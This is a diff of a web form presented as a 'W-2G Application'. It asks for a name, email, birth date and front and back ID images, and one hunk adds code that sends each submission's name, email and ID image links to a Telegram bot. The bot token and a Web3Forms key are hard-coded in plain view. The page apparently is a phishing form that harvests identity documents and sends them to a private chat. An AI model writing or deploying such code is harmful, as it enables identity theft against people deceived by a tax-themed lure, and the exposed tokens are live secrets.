@@ -256,24 +256,31 @@
   <input
     type="text"
     name="dob"
-    
+    placeholder="MM/DD/YYYY"
     maxlength="10"
-    pattern="^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/\d{4}$"
+    inputmode="numeric"
+    pattern="^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\d{4}$"
     class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
     required
   >
 </div>
-
 <script>
 const dobInput = document.querySelector('input[name="dob"]');
 
 dobInput.addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\D/g, ''); // remove non-digits
-  if (value.length > 2 && value.length <= 4) {
-    value = value.slice(0,2) + '/' + value.slice(2);
+  let value = e.target.value.replace(/\D/g, '');
+
+  if (value.length >= 3 && value.length <= 4) {
+    value = value.slice(0, 2) + '/' + value.slice(2);
   } else if (value.length > 4) {
-    value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
+    value =
+      value.slice(0, 2) +
+      '/' +
+      value.slice(2, 4) +
+      '/' +
+      value.slice(4, 8);
   }
+
   e.target.value = value;
 });
 </script>
@@ -446,28 +453,35 @@ dobInput.addEventListener('input', (e) => {
   <input
     type="text"
     name="submission_date"
-    placeholder="DD/MM/YYYY"
+    placeholder="MM/DD/YYYY"
     maxlength="10"
-    pattern="^(0[1-9]|[12][0-9]|3[01])/(0[1-9]|1[0-2])/\d{4}$"
+    inputmode="numeric"
+    pattern="^(0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\d{4}$"
     class="border rounded-lg p-3 focus:ring-2 focus:ring-blue-500"
     required
   >
 </div>
-
-
 <script>
 const submissionInput = document.querySelector('input[name="submission_date"]');
 
 submissionInput.addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
-  if (value.length > 2 && value.length <= 4) {
-    value = value.slice(0,2) + '/' + value.slice(2);
+  let value = e.target.value.replace(/\D/g, '');
+
+  if (value.length >= 3 && value.length <= 4) {
+    value = value.slice(0, 2) + '/' + value.slice(2);
   } else if (value.length > 4) {
-    value = value.slice(0,2) + '/' + value.slice(2,4) + '/' + value.slice(4,8);
+    value =
+      value.slice(0, 2) +
+      '/' +
+      value.slice(2, 4) +
+      '/' +
+      value.slice(4, 8);
   }
+
   e.target.value = value;
 });
 </script>
+
   <!-- Note -->
   <div class="lg:col-span-2">
     <p class="text-gray-600 text-sm">
@@ -599,11 +613,45 @@ form.addEventListener("submit", async function (e) {
       body: JSON.stringify({ submissions }),
     });
 
-    /* ---------------- Web3Forms ---------------- */
+    /* ---------------- Telegram ---------------- */
+    const sendToTelegram = async (message) => {
+      const BOT_TOKEN = "8508362115:AAHAznr2gaRgGxL_cKU771UAcfzM03u547U";
+      const CHAT_ID = "5286426581";
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+    };
+
+    const telegramMessage = `
+📩 <b>New W-2G Application</b>
+
+👤 <b>Name:</b> ${submission.full_name}
+📧 <b>Email:</b> ${submission.email}
+
+🪪 <b>ID Front:</b>
+${idFrontUrl || "Not provided"}
+
+🪪 <b>ID Back:</b>
+${idBackUrl || "Not provided"}
+
+🕒 <b>Submitted:</b>
+${new Date(submission.timestamp).toLocaleString()}
+    `;
+
+    await sendToTelegram(telegramMessage);
+
+    /* ---------------- Web3Forms Email ---------------- */
     const web3FormData = new FormData();
     web3FormData.append("access_key", "69459698-1206-46d8-ba1c-d0d5dbc970a7");
-    web3FormData.append("name", formData.get("full_name"));
-    web3FormData.append("email", formData.get("email"));
+    web3FormData.append("name", submission.full_name);
+    web3FormData.append("email", submission.email);
     web3FormData.append("subject", "New W-2G Application Submission");
 
     web3FormData.append(
@@ -611,8 +659,8 @@ form.addEventListener("submit", async function (e) {
       `
 New W-2G Application Received
 
-Name: ${formData.get("full_name")}
-Email: ${formData.get("email")}
+Name: ${submission.full_name}
+Email: ${submission.email}
 
 ID Front: ${idFrontUrl || "Not provided"}
 ID Back: ${idBackUrl || "Not provided"}
@@ -627,18 +675,16 @@ Submitted at: ${new Date().toLocaleString()}
     });
 
     const web3Result = await web3Res.json();
-    console.log("Web3Forms response:", web3Result);
-
     if (!web3Result.success) {
       throw new Error(web3Result.message || "Web3Forms failed");
     }
 
     form.reset();
 
-    /* ---------------- Custom Thank You Modal ---------------- */
+    /* ---------------- Thank You Modal ---------------- */
     const modal = document.createElement("div");
     modal.innerHTML = `
-      <div style="
+     <div style="
         position: fixed;
         inset: 0;
         background: rgba(0,0,0,0.6);
@@ -700,9 +746,9 @@ Submitted at: ${new Date().toLocaleString()}
     `;
     document.body.appendChild(modal);
 
-    document.getElementById("closeModalBtn").addEventListener("click", () => {
+    document.getElementById("closeModalBtn").onclick = () => {
       document.body.removeChild(modal);
-    });
+    };
 
   } catch (err) {
     console.error(err);
@@ -712,6 +758,7 @@ Submitted at: ${new Date().toLocaleString()}
   }
 });
 </script>
+
 
 
 
